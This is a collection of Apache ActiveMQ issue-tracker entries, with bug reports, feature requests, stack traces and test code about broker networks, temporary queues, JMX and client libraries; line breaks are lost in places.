Unable to run multithreaded MQ application, even for the simplest case.This is the peudo code, modified the ProducerTool.javaFor ( thread 1 to 30 ){    Connection  connection = createConnection();    Session session = createSession(connection);   Producer producer = createProducer(session);   sendMessages(producer, 20);  //send 20 messages to broker using all default settings}these are the exceptions from broker:Caught: javax.jms.JMSException: java.util.ConcurrentModificationException&#91;cp://localhost/127.0.0.1:61616&#93; ActiveMQConnection             WARN  Async exception with no exception listener: java.util.ConcurrentModificationExceptionjava.util.ConcurrentModificationException at java.util.HashMap$HashIterator.nextEntry(HashMap.java:787) at java.util.HashMap$EntryIterator.next(HashMap.java:829) at java.util.HashMap$EntryIterator.next(HashMap.java:827) at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.printProducers(ConnectionDotFileInterceptor.java:157) at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.generateFile(ConnectionDotFileInterceptor.java:140) at org.apache.activemq.broker.view.DotFileInterceptorSupport.generateFile(DotFileInterceptorSupport.java:47) at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.addProducer(ConnectionDotFileInterceptor.java:85) at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:90) at org.apache.activemq.broker.AbstractConnection.processAddProducer(AbstractConnection.java:397) at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:100) at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:201) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:143) at java.lang.Thread.run(Thread.java:595)and exception in the client side:javax.jms.JMSException: java.util.ConcurrentModificationException at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:45) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1137) at org.apache.activemq.AdvisoryConsumer.<init>(AdvisoryConsumer.java:45) at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1227) at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:435) at com.businessobjects.framework.services.mq.ToolSupport.createConnection(ToolSupport.java:51) at com.businessobjects.framework.services.mq.ProducerTool.run(ProducerTool.java:106)
issueID:AMQ-752
type:Bug
changed files:
texts:fix the uberjar to tidy up the notice/license files to make it absolutely clear whats going on
all the various LICENSEs need to be appended into a single LICENSE and the notices consolidated.Also we might want to... the MANIFEST lacks a Implementation-Vendor-Id. not reported harmful but isin the spec. suggested value: org.apache. the MANIFEST lacks a Specification-Version but has anImplementation-Version. suggested value 4.0. better if the source extracts into a directory with a different name fromthe binary distribution. for example, incubator-activemq-src for the sourceand incubator-activemq for the binary (say. i would prefer the binaries and distributions names to contain apache. forexample apache-incubator-activemq.
issueID:AMQ-753
type:New Feature
changed files:
texts:exposing the client IP Address
We have a requirement to validate a client"s host when a subscription request is performed. Is there a way to do this? If not, can we add this?
issueID:AMQ-754
type:New Feature
changed files:DestinationViewMBean.java
DestinationView.java
texts:Be nice to have a DestinationView.browse that could accept a message selector string
It would be nice if the DestinationView MBean could implement a browse command that could accept a message selector to filter the messages that could be browsed.
issueID:AMQ-755
type:Bug
changed files:
texts:possible bug with temporary queues and networks?
We have been experiencing some fairly serious problems with timeouts usingSpring, Lingo and a network of ActiveMQ brokers.As I understand it, lingo creates temporary queues to transport the remoteprocedure calls across JMS.We are suspicious that the messaging roundtrip gets interrupted or lost whenusing broker networks.We integrated ActiveMQ 4.0 into our project this week and ran the JMXjconsole to look at our broker network.We see temporary queues come and go, and what we are expecting is completereplication of the queues on each broker. Is this expectation correct?This is not what we are seeing.We believe that two things are happening:1) Temporary queues are not being cleaned up properly on all brokers.2) Temporary queues are not being created on a new broker when it is takendown and then restarted.Your feedback on these apparent issues would be appreciated.To substantiate our theory we created a couple of JUnit tests. (Our testcases do not include Lingo - just ActiveMQ client to broker.)TEST 1We create a network of brokers, create a message queue, send a message andthen take a broker down. We are expecting that the temporary message queuecreated will be removed from both brokers. It is not.The test fails on the last assert with:junit.framework.AssertionFailedError: No queues on broker 3 expected:<1> butwas:<0>Source code follows: public void testTempQueueCleanup() throws Exception {   ActiveMQConnectionFactory cf;   Connection conn = null;   Session sess = null;   try {     cf = new ActiveMQConnectionFactory("failover:(tcp://localhost:61626%3FsoTimeout=5000,tcp://localhost:61627%3FsoTimeout=5000)?maximumRetries=0&establishConnectionTimeout=21000&keepAliveTimeout=300000");     conn = cf.createConnection();     sess = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);     TemporaryQueue q = sess.createTemporaryQueue();     BrokerService broker2 = createBroker("broken2","tcp://localhost:61627", "static:(tcp://localhost:61626)");     Thread.sleep(5000);     assertEquals("No queues on broker 1", 1,broker1.getAdminView().getTemporaryQueues().length);     assertEquals("No queues on broker 2", 1,broker2.getAdminView().getTemporaryQueues().length);     q.delete();     assertEquals("Temp queue left behind on broker 1", 0,broker1.getAdminView().getTemporaryQueues().length);     assertEquals("Temp queue left behind on broker 2", 0,broker2.getAdminView().getTemporaryQueues().length);     broker2.stop();   } finally {     if (sess!=null)       sess.close();     if (conn!=null)       conn.close();   } }TEST 2When stopping a broker and then restarting it, we expect to see all queuesreplicated on the new broker.This test fails with:junit.framework.AssertionFailedError: No queues on broker 3 expected:<1> butwas:<0>Source code: public void testTempQueueRecovery() throws Exception {   ActiveMQConnectionFactory cf;   Connection conn = null;   Session sess = null;   try {     cf = new ActiveMQConnectionFactory("failover:(tcp://localhost:61626%3FsoTimeout=5000,tcp://localhost:61627%3FsoTimeout=5000)?maximumRetries=0&establishConnectionTimeout=21000&keepAliveTimeout=300000");     conn = cf.createConnection();     sess = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);     TemporaryQueue q = sess.createTemporaryQueue();     BrokerService broker2 = createBroker("broken2","tcp://localhost:61627","static:(tcp://localhost:61626,tcp://localhost:61628)");     Thread.sleep(5000);     assertEquals("No queues on broker 1", 1,broker1.getAdminView().getTemporaryQueues().length);     assertEquals("No queues on broker 2", 1,broker2.getAdminView().getTemporaryQueues().length);     BrokerService broker3 = createBroker("broken3","tcp://localhost:61628","static:(tcp://localhost:61626,tcp://localhost:61627)");     assertEquals("No queues on broker 3", 1,broker3.getAdminView().getTemporaryQueues().length);     Thread.sleep(5000);     q.delete();     Thread.sleep(5000);     assertEquals("Temp queue left behind on broker 1", 0,broker1.getAdminView().getTemporaryQueues().length);     assertEquals("Temp queue left behind on broker 2", 0,broker2.getAdminView().getTemporaryQueues().length);     assertEquals("Temp queue left behind on broker 3", 0,broker3.getAdminView().getTemporaryQueues().length);     broker3.stop();     broker2.stop();   } finally {     if (sess!=null)       sess.close();     if (conn!=null)       conn.close();   } }
issueID:AMQ-757
type:Improvement
changed files:
texts:MapMessage to support nested Map objects to create a typesafe hierarchial message such as used on RV etc
None
issueID:AMQ-759
type:Improvement
changed files:
texts:Removed the gbean modules as they have moved to the Geronimo project source tree
See: http://issues.apache.org/jira/browse/GERONIMO-2132
issueID:AMQ-765
type:Bug
changed files:
texts:ActiveMQ RA serialization issue on Glassfish
I"ve been trying to work through an issue with a NullPointerException run using the JCA 1.5 resource adapter on Glassfish.  In the course of debugging, Siva from the Glassfish team provided this information:"Thanks for trying out GlassFish. Since I have only the trace snippet above, I tried to debug this problem by going through ActiveMQ RA"s source available at https://svn.apache.org/repos/asf/incubator/activemq/trunk/activemq-ra/src/main/java/org/apache/activemq/ra/This is what I understand happens. Please correct me if there are errors. When ActiveMQConnectionFactory https://svn.apache.org/repos/asf/incubator/activemq/trunk/activemq-ra/src/main/java/org/apache/activemq/ra/ActiveMQConnectionFactory.java is created at the createConnectionFactory method of https://svn.apache.org/repos/asf/incubator/activemq/trunk/activemq-ra/src/main/java/org/apache/activemq/ra/ActiveMQManagedConnectionFactory.java, the ConnectionManager is initialized to a transient variable "manager". Since ConnectionFactory instances can be serialized/deserialized while publishing to JNDI (as is the case in Project GlassFish), the connectionManager reference is lost and hence the NPE. The fix ideally should be in the ActiveMQRA"s code. You could copy me &#91;sivakumart AT sun DOT com&#93; while you are discussing this with ActiveMQ, if you wish. If you still have any issues, please provide a copy of your domain.xml &#91;connector connection pool, resource configuratin information&#93; and the entire trace in server.log."
issueID:AMQ-769
type:Improvement
changed files:PolicyEntry.java
SimpleMessageGroupMapFactory.java
MessageGroupMapFactory.java
Queue.java
MessageGroupHashBucketFactory.java
texts:Expose MessageGroupMap implementation to be configurable via BrokerService property
I need to use the SimpleMessageGroupMap implmentation of MessageGroupMap instad of the default MessageGroupHashBucket implmentation. Presently there"s no easy way to do this. Additionally the member  "messageGroupOwners" in org.apache.activemq.broker.region.Queue is private, with no setter and the getter has     public MessageGroupMap getMessageGroupOwners() {        if (messageGroupOwners == null) {            messageGroupOwners = new MessageGroupHashBucket(messageGroupHashBucketCount);        }        return messageGroupOwners;    }So basically there"s no easy way to use another implmentation of MessageGroupMap in this class. (This lazy create method is also not threadsafe. Might be better to default initialize messageGroupOwners )I had to jump through a bunh of hoops, starting with subclassing BrokerService exposing the messageGroupOwners class, followed by overriding createRegionBroker() where it creates an annonymous subclass of RegionBroker , overriding createQueueRegion and createTempQueueRegion where I create subclasses of  QueueRegion and TempQueueRegion respectively to have them be configured to use the configured MessageGroupMap.
issueID:AMQ-772
type:Bug
changed files:
texts:Build ships without activemq-web-4.0.jar
Build ships without activemq-web-4.0.jar, so WAR generated by ant task incomplete.  I had to add this myself.  Can you please add it to the release?
issueID:AMQ-773
type:Bug
changed files:
texts:Build ships without incompatitable commons-logging and log4j
commons-logging calls Category.log in lo4j, which is depericated in the version of log4j that ships in 4.0.1.Please upgrade the commons-log to commons-logging-1.1.jar
issueID:AMQ-775
type:Bug
changed files:
texts:MessageAuthorizationPolicy doesn&#39;t work
Use default config, set a MessageAuthorizationPolicy to BrokerService and start the broker.There are several issues:1) In BrokerService::startTransportConnector() method, connector.setMessageAuthorizationPolicy(policy); is in the wrong place, it should be moved to almost the very end of the method, otherwise if you use JMX, the ManageedTransportConnector won"t have authorization policy info.2) ManagedTransportConnector doesn"t pass the auth policy to ManagedTransport, I think the easiest way to fix it is in AbstractConnection constructor,adding this line:    this.messageAuthorizationPolicy = connector.getMessageAuthorizationPolicy();and remove this line:   answer.setMessageAuthorizationPolicy(messageAuthorizationPolicy); from TransportConnector::createConnection(), then it will work for both TransportConnection and ManagedTransportConnection3) AbstrctConnection doesn"t pass the auth policy to ConnectionContext, I think this can be fixed by adding this line:  context.setMessageAuthorizationPolicy(this.getMessageAuthorizationPolicy());to AbstractConnection::processAddConnection() method.Now the auth policy can be reached by MessageAuthorizationPolicy::isAllowedToConsume(ConnectionContext context, Message message) method, but the real problem is message value is null, but we need to use it to check right, some of the right information is a property inside the message. Please take a look at the problem, thanks
issueID:AMQ-776
type:Bug
changed files:ConduitBridge.java
texts:ConduitBridge can malfunction when first of a set of consumers goes away
When the following scenario is followed, any of the subsequent consumers will stop receiving messages.  I"ve reproduced this using the ConsumerTool, and ProducerTool supplied in the example area of the distribution.+++++++++++++++++++++++Start Broker AStart Broker BStart Consumer 1, connecting to Broker B, consuming FOOStart Consumer 2, connecting to Broker B, consuming FOOStart Publisher, connecting to Broker A, publishing FOOCtl-C out of Consumer 1Consumer 2 stops receiving messages+++++++++++++++++++Seems to me that ConduitBridge is supposed to track all consumers for a given subscription, by way of DemandSubscription.  It is seeding DemandSubscription with the originating consumer, but when subsequent consumers are added, the ConduitBridge::addToAlreadyInterestedConsumers re-adds the original subscriber to the DemandSubscription"s map - so the map only ever has the original subscription.I"ve attached a patch.  Hope the change is good.
issueID:AMQ-777
type:Bug
changed files:
texts:maxReconnectAttempts has no effect
I saw this entry in the forums and I"m having the same problem, setting maxReconnectAttempts to a specific value does not stop the infinite loop of "Waiting for transport to reconnect" from occuring.http://www.nabble.com/Discovery-Fail-if-no-Broker-t1824894.html#a4977620The forum reply from Hiram Chirino suggests it"s a bug but I didn"t find an associated JIRA issue.Jonny
issueID:AMQ-780
type:Improvement
changed files:BrokerStoppedException.java
AbstractConnection.java
ErrorBroker.java
texts:Suppress logging client exceptions on the broker when the broker is shutting down.
When a client is sending async exceptions to the broker, and the borker is shutdown there is a windows where the client connector gets errors from the broker because the client continues to send messaes to the connector even though the broker has been shutdown.We should suppress the logging fo those exceptions on the broker side if the broker has been shutdown and we should send back 1 single connection error to the client informing it that the broker has been shutdown.  We should also subsequently stop the client connection so no further messaes are received from the client.
issueID:AMQ-781
type:Improvement
changed files:MulticastDiscoveryAgent.java
texts:Suppress the MulticastDiscoveryAgent error message during shutdown regarding: failed to process packet:
None
issueID:AMQ-787
type:Bug
changed files:UdpTransport.java
texts:The UdpTransport could potentialy fail to bind on linux.. caused the UdpTransportTest to fail sometimes.
&#91;junit&#93; &#91;ERROR&#93; Test org.apache.activemq.transport.udp.UdpTransportTest FAILED
issueID:AMQ-788
type:Improvement
changed files:
texts:MapMessage should support largs String values
Currently the largest string value that you can put in a MapMessage is about 32k big.  We should support bigger String values also.
issueID:AMQ-789
type:Bug
changed files:WireFormatNegotiator.java
texts:WireFormatNegotiator could hang a client or server connection if the peer disconnects before sending the wire format info
None
issueID:AMQ-790
type:Bug
changed files:XBeanBrokerFactory.java
texts:support for non-XBean based XML configuration files does not seem to work
It seems we don"t currently support regular Spring XML configuration files when using the "activemq" command. Steps to reproduce:&#91;john@prokopiev jms&#93;$ unzip incubator-activemq-4.0.1.zipArchive:  incubator-activemq-4.0.1.zip  creating: incubator-activemq-4.0.1/  creating: incubator-activemq-4.0.1/bin/  creating: incubator-activemq-4.0.1/conf/  creating: incubator-activemq-4.0.1/docs/  creating: incubator-activemq-4.0.1/example/  creating: incubator-activemq-4.0.1/example/activemq-web-console/...  inflating: incubator-activemq-4.0.1/userGuide.html  inflating: incubator-activemq-4.0.1/var/activemq.log&#91;john@prokopiev jms&#93;$ echo "<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN//EN""http://www.springframework.org/dtd/spring-beans.dtd"><beans><bean id="broker" class="org.apache.activemq.broker.BrokerService"init-method="start"><property name="transportConnectorURIs"><list><value>tcp://localhost:61234</value></list></property></bean></beans> " > incubator-activemq-4.0.1/conf/activemq.xml&#91;john@prokopiev jms&#93;$ cd incubator-activemq-4.0.1/bin&#91;john@prokopiev bin&#93;$ sh activemqACTIVEMQ_HOME: /home/john/devel/java/jms/incubator-activemq-4.0.1Loading message broker from: xbean:activemq.xmlINFO  BrokerService                  - ActiveMQ 4.0.1 JMS Message Broker(localhost) is startingINFO  BrokerService                  - For help or more information pleasesee: http://incubator.apache.org/activemq/INFO  JDBCPersistenceAdapter         - Database driver recognized:&#91;apache_derby_embedded_jdbc_driver&#93;INFO  JournalPersistenceAdapter      - Journal Recovery Started from: ActiveJournal: using 2 x 20.0 Megs at:/home/john/devel/java/jms/incubator-activemq-4.0.1/bin/activemq-data/localhost/journalINFO  JournalPersistenceAdapter      - Journal Recovered: 0 message(s) intransactions recovered.INFO  TransportServerThreadSupport   - Listening for connections at:tcp://prokopiev.stc.donpac.ru:61234INFO  TransportConnector             - Connectortcp://prokopiev.stc.donpac.ru:61234 StartedINFO  BrokerService                  - ActiveMQ JMS Message Broker(localhost, ID:prokopiev.stc.donpac.ru-41458-1151926448246-1:0) startedERROR: java.lang.RuntimeException: Failed to execute start task. Reason:java.lang.ClassCastException: org.apache.activemq.broker.BrokerServiceERROR: java.lang.Exception: java.lang.ClassCastException:org.apache.activemq.broker.BrokerServiceINFO  BrokerService                  - ActiveMQ Message Broker (localhost,ID:prokopiev.stc.donpac.ru-41458-1151926448246-1:0) is shutting downINFO  TransportConnector             - Connectortcp://prokopiev.stc.donpac.ru:61234 StoppedINFO  VMTransportFactory             - Shutting down VM connectors forbroker: localhostINFO  BrokerService                  - ActiveMQ JMS Message Broker(localhost, ID:prokopiev.stc.donpac.ru-41458-1151926448246-1:0) stopped
issueID:AMQ-791
type:New Feature
changed files:TopicSubscription.java
AbstractPendingMessageCursor.java
PendingMessageCursor.java
FilePendingMessageCursor.java
texts:support spool to disk for non-persistent topic consumers
Rather than just blocking when RAM is full we could have a high-water mark where we start spooling messages to disk if there is not sufficient RAM to hold the messages.The good thing about this approch is that it avoids blocking the producers when RAM is full; the downside is that once spooling starts, the producer will be slowed down to the speed of the disk spooling (as due to RAM exhaustion under steady state, the producer will have to wait for the message to be spooled to disk so that it can evict it from RAM so that it can send the next message).Though the journal is quite fast so the slow down shouldn"t be too many orders of magnitude (and is better than making things appear to "lock up" while we wait for the slowest consumer to acknowledge more messages).
issueID:AMQ-792
type:Improvement
changed files:
texts:allow asynchronous dispatch to consumers in the broker for non-durable topics
We typically use the current thread in the broker to dispatch to all the available non-durable consumers for performance - as this hugely reduces the context switching and increases performance. However (see AMQ-688) sometimes this can cause one dead consumer to block a producer.Some folks may want to switch this strategy to use slower asynchronous dispatch with a thread pool to reduce the risk of blocking a producer at the expensive of lower performance
issueID:AMQ-794
type:Improvement
changed files:BrokerService.java
texts:make the support of advisory messages optional (so that they can be disabled to reduce RAM and boost performance a little)
None
issueID:AMQ-795
type:Improvement
changed files:
texts:security plugin to deal with temporary queue and topics better
Allow a role to be specified for read/write/admin of temporary queue and temporary topics
issueID:AMQ-796
type:Bug
changed files:ActiveMQConnection.java
texts:Client may shtudown when failover connection is reconnecting.  We need to maintain at least 1 non-daemon thread alive.
Dejan Reported on the User lists:Hi,after some experiments I found that this problem only exists if there are noother threads in the application. It seems like connection thread diesbefore it manages to reconnect. By starting another thread in theapplication, it succeeds to recover from master failure and reconnect to theslave broker. So I have a workaround for now, but it would be nice to makethis work even for simple (single-threaded) clients.Regards,Dejan
issueID:AMQ-797
type:Bug
changed files:
texts:ActiveMQ Cpp Windows Makefiles fail to link the test, and test-integration targets
The windows makefiles for the MinGW targets fail to link the test and test-integration targets.When the code was submitted the makefiles were changed to build the library with the libactivemq-cpp.a name, but the windows makefiles still try and link the tests against libactivemq.a
issueID:AMQ-798
type:New Feature
changed files:QueueSubscription.java
texts:provide a new JMS header to indiciate the first message in a sequence being dispatched to a consumer
This would allow consumers to listen for this message and if the boolean is set its the first message being dispatched for a group & so the consumer could flush a cache or something
issueID:AMQ-799
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Handle async ConnectionError that may happen between brokers using a network bridge.
None
issueID:AMQ-800
type:New Feature
changed files:ConsumerTool.java
build.xml
RequesterTool.java
texts:Expand the examples shipped with ActiveMQ to also be able to test request reply message exchanges.
None
issueID:AMQ-801
type:Bug
changed files:
texts:activemq-jaas is not in the release distro
it should be in the activemq.jar and in the lib directory...
issueID:AMQ-802
type:Bug
changed files:DemandForwardingBridge.java
DemandForwardingBridgeSupport.java
DiscoveryNetworkConnector.java
texts:Broker Network connections over SSH tunnels do not get established.
Due to the way that ssh tunnels accept a connection but then close a socket if they cannot establish a connection to the remote host, the network connector fails to re-connect to the remote host when it is started.
issueID:AMQ-803
type:New Feature
changed files:SimpleDiscoveryAgent.java
texts:The static discovery agent should include reconnect logic when it is notified that one of it&#39;s sevices failed.
This could substancially make the network connector code simpler since it does not need to deal with failover connections which cause problems for the connector.
issueID:AMQ-806
type:New Feature
changed files:HttpClientTransport.java
HttpTransportFactory.java
HttpTunnelServlet.java
texts:Support a ?trace=true option on the http client side transport
None
issueID:AMQ-808
type:Bug
changed files:
texts:The DestinationMap removeAll is removing too many nodes out of the map.
This was initially noticed because at times avisoryies stopped working for some cases.  This is due to the way the Region uses a DestinationMap to find all the destinations that match a subscription.A unit test that fails looks like:    public void testAddAndRemove() throws Exception {             put("FOO.A", v1);        assertMapValue("FOO.>", v1);                put("FOO.B", v2);                assertMapValue("FOO.>", v1, v2);                Set set = map.removeAll(createDestination("FOO.A"));                assertMapValue("FOO.>", v2);  // This Fails.  nothing is left in FOO.>            }
issueID:AMQ-809
type:Improvement
changed files:TransportLogger.java
texts:Make it easier to just enable the command trancing of the TransportLogger.
The log4j category for trace logging of message currently org.apache.activemq.transport.TransportLogger:nthis makes it hard to enable the debug logging of just the trace messages since org.apache.activemq.transport is too broad of a category and TransportLogger:n is a variable category name.We should make it org.apache.activemq.transport.TransportLogger.Connection:n so that it"s easier to just enable the logging for this one component.  Also log usage of the other request methods.
issueID:AMQ-810
type:Bug
changed files:ConduitBridge.java
texts:When using Topics with consumers with selectors over a network of brokers, only the first consumer gets messages delivered.
The subscription conduit is blocking out subsequent subscriptions from being propagated over the network bridge
issueID:AMQ-811
type:Improvement
changed files:InactiveDurableSubscriptionView.java
BrokerViewMBean.java
DurableSubscriptionView.java
DurableSubscriptionViewMBean.java
texts:MBean improvements
We could do with some improvements in the MBean APIs... allow Messages to be browsed on a BrokerViewMBean (e.g. adding a browseMessages() or browseMessages(selector) method allow durable subscriptions to be destroyed via DurableSubscriptionViewMBean.destroy()For more background seehttp://www.nabble.com/ActiveMQ-JMX-Questions..-tf1917262.html#a5248649http://www.nabble.com/Maintaining-connections-subscriptions-tf1921466.html#a5260973
issueID:AMQ-812
type:Improvement
changed files:BrokerService.java
texts:add the ability to find all active and inactive queues & topics in the system as MBeans
Currently we only show active destinations in JMX. We need a way to show all of them, including inactive ones
issueID:AMQ-814
type:Task
changed files:
texts:Remove the Maven 1 build files since maven 2 is now the prefered way to build ActiveMQ
None
issueID:AMQ-822
type:Bug
changed files:UdpTransportFactory.java
texts:Eclipse fails to compile activemq-core due to invalid symbol in UdpTransportFactory.java
UdpTransportFactory contains commented out code that contain symbol that eclipse cannot handle. The following fix was sufficient for code to be compiled without problem:fateev@fateev:/workplace/fateev/activemq/trunk> svn diff activemq-core/src/main/java/org/apache/activemq/transport/udp/UdpTransportFactory.javaIndex: activemq-core/src/main/java/org/apache/activemq/transport/udp/UdpTransportFactory.java===================================================================&#8212; activemq-core/src/main/java/org/apache/activemq/transport/udp/UdpTransportFactory.java      (revision 421719)+++ activemq-core/src/main/java/org/apache/activemq/transport/udp/UdpTransportFactory.java      (working copy)@@ -161,7 +161,7 @@ switch to the target endpoint // based on the last packet that was received // so that all future requests go to the newly created UDP channel Endpoint from = info.getFrom(); * System.out.println("####&#65533;setting the client side target to: " ++         * System.out.println("####setting the client side target to: " + from); udpTransport.setTargetEndpoint(from); } }; return transport;          */     }fateev@fateev:/workplace/fateev/activemq/trunk>
issueID:AMQ-823
type:Bug
changed files:
texts:Incorect handling of message size in ByteArrayOutputStream::write
when you are sending message via openwire protocol, ByteArrayOutputStream::write is called in certain moment ...when message size is greater then defaul CHUNK space is reallocated and there is "check for EOF offset".   if( offset > bodySize )            expandBody() ; but should be there   if ( offset >= bodySize )             expandBody();
issueID:AMQ-824
type:Bug
changed files:
texts:Missing NULL pointer check in  MessageConsumer::autoAcknowledge
When you call consumer->receive() on empty queue receive method returns NULL message but before return MessageConsumer::autoAcknowledge method is invoked. This method doesn"t check message against NULL, this cause coredump is message is NULL.Patch: p<IMessage> MessageConsumer::autoAcknowledge(p<IMessage> message){    try    {        if ( message != NULL ) {   // <------ Check NULL here !!!!!          // Is the message an ActiveMQMessage? (throws bad_cast otherwise)          p<ActiveMQMessage> activeMessage = p_dyncast<ActiveMQMessage> (message) ;          // Register the handler for client acknowledgment          activeMessage->setAcknowledger( smartify(this) ) ;          if( acknowledgementMode != ClientAckMode )              doAcknowledge(activeMessage) ;        }    }    catch( bad_cast& bc )    {        // ignore    }    return message ;
issueID:AMQ-825
type:Bug
changed files:
texts:activemq fails to work with spring-2.0-rc1
we get a failure trying to coerce a String into a File for the dataDirectory property on the DefaultPersistenceAdapterFactory
issueID:AMQ-826
type:Improvement
changed files:
texts:LDAP based authorization support
Patch kindly added by ngcutura - discussion thread...http://www.nabble.com/LDAP-Authorization-tf1851705.html#a5344494
issueID:AMQ-827
type:Improvement
changed files:PolicyEntry.java
pom.xml
MemoryPropertyEditor.java
DefaultPersistenceAdapterFactory.java
FailoverTransport.java
JournalPersistenceAdapter.java
RapidPersistenceAdapter.java
KahaPersistenceAdapter.java
activemq.xml
JmsConnector.java
UsageManager.java
activemq-nojournal.xml
QuickJournalPersistenceAdapter.java
texts:allow the usageManager to be configured in Kb or Mb to make configuration a little easier
something like<usageManager limitMb="100"/> would be much simpler than having to get the calculator out to type 100 * 1024 * 1024
issueID:AMQ-828
type:Improvement
changed files:
texts:add some XML configuration way to force the creation of certain destinations on startup
e.g. have some kind of XML like<destinations><queues>  <queue>foo.bar</queue>  <queue>foo.xyz</queue></queues><topics>  <topic>a.b.c</topic></topics></destinations>
issueID:AMQ-829
type:Improvement
changed files:FailoverTransport.java
texts:use some INFO level logging in failover: transport when a transport error occurs and when the transport is resumed
So choose a few log statements and make them info by default
issueID:AMQ-831
type:New Feature
changed files:BrokerService.java
JDBCPersistenceAdapter.java
Statements.java
DefaultDatabaseLocker.java
DatabaseLocker.java
BrokerServiceAware.java
texts:provide a JDBC based exclusive lock so that if just using the JDBCPersistenceAdapter (without the journal) we can have failover of brokers
It would be good to be able to start, say, 3 brokers all talking to the same database such that the first one in locks a table with an exclusive lock and stops other nodes from getting in. If that broker fails, its connection to the database dies then another broker should be able to jump in and take over.Basically a JDBC version of the file locking mechanism already in the journal code such as in these examples...http://svn.apache.org/viewvc/incubator/activemq/trunk/activeio/activeio-core/src/main/java/org/apache/activeio/journal/active/ControlFile.java?view=markuphttp://svn.apache.org/viewvc/incubator/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/store/DefaultPersistenceAdapterFactory.java?revision=421936&view=markup
issueID:AMQ-834
type:Improvement
changed files:ManagedRegionBroker.java
texts:use the clientID rather than connectionID for the name of subscriptionIDs in JMX
Folks can customize their clientIDs so it"d make more sense to make more use of those rather than the connectionID when displaying subscriptions in JMX (e.g. the current tree of subscriptions).
issueID:AMQ-835
type:Bug
changed files:ActiveMQConnection.java
texts:memory leak in ActiveMQConnection
when connection closing, connection doesn"t remove itself from factoryStats. so every opened connection cause to grow memory. this can be fixed by adding factoryStats.removeConnection(this); in the close() method.
issueID:AMQ-836
type:New Feature
changed files:
texts:add a clientIDPrefix to ActiveMQConnectionFactory so that we can specify the prefix for any auto-generated clientIDs
Its very useful to configure clientIDs on JMS connections for when browsing the status of a system via JMX...http://incubator.apache.org/activemq/jmx.htmlhowever the JMS specification only allows you to set the clientID for a single Connection. So in an application where you are using a ConnectionFactory to make multiple connection objects you cannot specify a client ID easily.So it would be good to allow a clientIDPrefix to be set which can then be appended with a counter/timestamp to ensure uniqueness - but at least it will start with a descriptive text in consoles etc
issueID:AMQ-839
type:Bug
changed files:RegionBroker.java
texts:Opening a connection after closing a connectoin with the same clientid sometimes fails
If a client closes a connection, and then fairly quicly tries to open a connection with the same clientid, this sometimes fails.  Apparently, the connection is not completely closed on the broker when the close on the connection completes.  This allows the client to try to open a conection and receive a client already connected exception.   The close connection should not return until the connection is actually closed, or at least an attribute on the collection should allow for setting if you want to wait or not.
issueID:AMQ-840
type:Improvement
changed files:ActiveMQXAConnectionFactory.java
package.html
ActiveMQConnectionFactory.java
texts:add spring aware ConnectionFactory implementations which automatically set the clientIDPrefix from the Spring Bean Name
This will make it a little easier to debug and trace JMS applications if you have many different JMS connections being created in different applications or WARs if you use descriptive bean names for each connection
issueID:AMQ-841
type:Bug
changed files:BrokerService.java
texts:NullPointerException when using MasterConnector and specifying the broker name with space in it.
I"ve got a hard time trying to figure out why I got a null pointer trying to use the Master/slave configuration for ActiveMQ. Finnally by looking at the code I"ve saw the following:In BrokerService.java public void initializeMasterConnector(URI remoteURI) throws Exception { ...URI localURI = getVmConnectorURI();...}public URI getVmConnectorURI() {        if (vmConnectorURI == null) {            try {                vmConnectorURI = new URI("vm://" + getBrokerName());            }            catch (URISyntaxException e) {            }        }        return vmConnectorURI;}My problem is that I"ve specified a broker name with space in it  "Slave Broker". So I the new URI() here throw a URISyntaxException that was badly absorb. And this leads to a null pointer at line:159 of TransportFactory.java.   String scheme = location.getScheme(); when location is null du to the previous exception.The link between the error and the cause was not clear at the first sigth. A precondition on the setBrokerName could do the job.
issueID:AMQ-842
type:Improvement
changed files:
texts:Amazon&#39;s contributed C++ Openwire Client
In the spirit of OSCON, here is the latest tarball of our C++ Openwire client.  I believe that all of the source headers are in order.  (at last!)High-level documentation:  http://www.activemq.org/site/openwire-cpp-client.htmlLet me know what I can do to expedite this being committed.  Thanks for your patience guys.In order for this to be committed, we need the following at the bottom of the project NOTICE file:Portions of this software copyright 2006 Amazon.com, inc.
issueID:AMQ-843
type:Bug
changed files:
texts:temporary queues seem to not work properly in C# when trying to implement request response
The following code seems to fail...//Send msg to common q with reply to temp q.            ITemporaryQueue tempQ = session.CreateTemporaryQueue();            rqstMsg.NMSReplyTo = tempQ;            rqstMsg.NMSPersistent = false;            producer.Send(rqstMsg);            //Get msg from common q.            ActiveMQTextMessage request = consumer.Receive(new TimeSpan(0, 0, 5)) as ActiveMQTextMessage;            ITextMessage response = session.CreateTextMessage("this is a response!!");            response.NMSCorrelationID = request.NMSCorrelationID;            IMessageProducer producerTempQ = session.CreateProducer( request.NMSReplyTo);            //Write msg to temp q.            producerTempQ.Send(response); //EXCEPTION: QUEUE DOESNT EXIST
issueID:AMQ-845
type:Bug
changed files:
texts:Sending messages to a topic with an inactive durable subscription will hang producers
